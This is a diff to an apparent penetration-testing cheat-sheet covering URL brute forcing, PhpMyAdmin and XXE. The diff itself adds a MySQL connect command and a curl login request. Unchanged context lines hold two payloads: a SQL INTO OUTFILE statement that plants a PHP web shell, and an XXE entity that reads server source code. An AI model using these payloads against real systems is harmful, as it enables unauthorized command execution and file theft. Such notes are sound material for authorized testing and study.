@@ -3,6 +3,7 @@
 - [BruteForce Url](#bruteforce-url)
 - [PhpMyAdmin](#phpmyadmin)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
+- [Mysql](#mysql)
 
 ## BruteForce Url
 ### Gobuster
@@ -47,4 +48,16 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
     <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 ]>
 <foo>Hello &file;</foo>
+```
+
+## MySql
+### Connect to mysql
+```
+mysql -h localhost -u myname -p
+```
+
+## Request
+### Curl
+```
+curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
 ```
